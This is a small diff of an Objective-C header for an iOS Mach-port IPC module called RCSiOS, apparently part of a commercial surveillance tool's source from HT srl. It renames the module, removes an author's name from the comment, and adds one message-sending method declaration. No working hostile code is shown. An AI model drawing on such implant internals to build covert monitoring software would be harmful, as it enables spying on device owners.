@@ -1,9 +1,9 @@
 /*
- * RCSIpony - IPC through machport
+ * RCSiOS - IPC through machport
  *  since shmget = ENOSYS
  *
  *
- * Created by Alfredo 'revenge' Pesoli on 11/09/2009
+ * Created on 11/09/2009
  * Copyright (C) HT srl 2009. All rights reserved
  * Adapted from RCSMac by Massimo Chiodini on 05/03/2010
  *
@@ -80,6 +80,8 @@
 
 - (int)createCoreRLSource;
 - (NSMutableArray*)fetchMessages;
+
++ (BOOL)sendMessageToCoreMachPort:(NSData*)aData withMode:(NSString*)aMode;
 + (BOOL)sendMessageToMachPort:(mach_port_t)port 
                      withData:(NSData *)aData;
                      
